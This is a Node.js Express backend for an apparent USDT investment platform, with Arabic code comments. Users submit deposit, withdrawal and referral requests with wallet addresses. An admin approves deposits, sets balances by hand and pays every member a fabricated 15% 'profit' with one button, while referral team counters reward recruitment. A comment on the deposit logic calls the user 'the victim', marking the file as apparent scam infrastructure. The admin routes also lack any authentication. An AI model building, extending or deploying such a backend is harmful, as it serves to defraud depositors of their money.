const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// مخازن البيانات المؤقتة لربط واجهة المستخدم بلوحة المشرف حياً
let users = {}; 
let pendingRequests = []; 

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// 1. تسجيل مستخدم جديد أو جلب بياناته الحالية
app.post('/api/register-user', (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: "الاسم مطلوب" });

    if (!users[username]) {
        users[username] = {
            username: username,
            totalBalance: "USDT 0.00",
            dailyProfit: "USDT 0.00",
            bonus: "USDT 0.00",
            activeTeam: 0
        };
    }
    res.status(200).json({ success: true, user: users[username] });
});

// 2. استقبال عمليات السحب، الشحن، والإحالات من واجهة المستخدم
app.post('/api/submit-request', (req, res) => {
    const { username, type, amount, wallet, details } = req.body;
    
    const newRequest = {
        id: Date.now(),
        username: username || "مستخدم غير معروف",
        type: type, 
        amount: amount || "0",
        wallet: wallet || "---",
        details: details || "",
        status: "Bekliyor" 
    };

    pendingRequests.push(newRequest);
    console.log(`📡 طلب جديد قادم للمشرف: [${type}] من [${username}] بمبلغ ${amount}`);
    res.status(200).json({ success: true });
});

// 3. جلب الطلبات المعلقة إلى لوحة التحكم
app.get('/api/admin/requests', (req, res) => {
    res.status(200).json(pendingRequests);
});

// 4. جلب قائمة الأعضاء لمراقبة الأرصدة حياً
app.get('/api/admin/users', (req, res) => {
    res.status(200).json(Object.values(users));
});

// 5. اتخاذ إجراء المشرف (قبول أو رفض الطلب وتحديث أرصدة المستخدم تلقائياً)
app.post('/api/admin/action', (req, res) => {
    const { requestId, action } = req.body;
    
    // البحث عن الطلب المعني
    const targetRequest = pendingRequests.find(r => r.id === requestId);
    
    if (targetRequest && action === 'onayla') {
        const user = users[targetRequest.username];
        if (user) {
            const numAmount = parseFloat(targetRequest.amount) || 0;
            
            // إذا كان الطلب شحن رصيد، نقوم بزيادة إجمالي رأس المال تلقائياً للضحية
            if (targetRequest.type.includes("شحن") || targetRequest.type.includes("Kontör")) {
                const currentCapital = parseFloat(user.totalBalance.replace("USDT ", "")) || 0;
                user.totalBalance = `USDT ${(currentCapital + numAmount).toFixed(2)}`;
            } 
            // إذا كان طلب مكافأة إحالة بنفسجية
            else if (targetRequest.type.includes("إحالة") || targetRequest.type.includes("Referans")) {
                user.bonus = `USDT 50.00`; // إضافة مكافأة إحالة ثابتة كمثال
                user.activeTeam = Math.min(user.activeTeam + 1, 40); // زيادة عداد الفريق
            }
        }
    }

    // إزالة الطلب من قائمة المعلقات بعد اتخاذ القرار
    pendingRequests = pendingRequests.filter(r => r.id !== requestId);
    res.status(200).json({ success: true });
});

// 6. توزيع الأرباح بنسبة 15% لجميع الأعضاء كإجراء جماعي من المشرف
app.post('/api/admin/distribute-profits', (req, res) => {
    Object.keys(users).forEach(username => {
        const user = users[username];
        const capital = parseFloat(user.totalBalance.replace("USDT ", "")) || 0;
        
        if (capital > 0) {
            const calculatedProfit = capital * 0.15; // احتساب الـ 15%
            const currentDaily = parseFloat(user.dailyProfit.replace("USDT ", "")) || 0;
            user.dailyProfit = `USDT ${(currentDaily + calculatedProfit).toFixed(2)}`;
        }
    });
    res.status(200).json({ success: true });
});

// مسارات الصفحات الأساسية
app.get('/admin-panel', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.listen(PORT, () => {
    console.log(`🚀 السيرفر السحابي يعمل بنجاح والربط التلقائي متصل بالكامل عبر المنفذ: ${PORT}`);
});
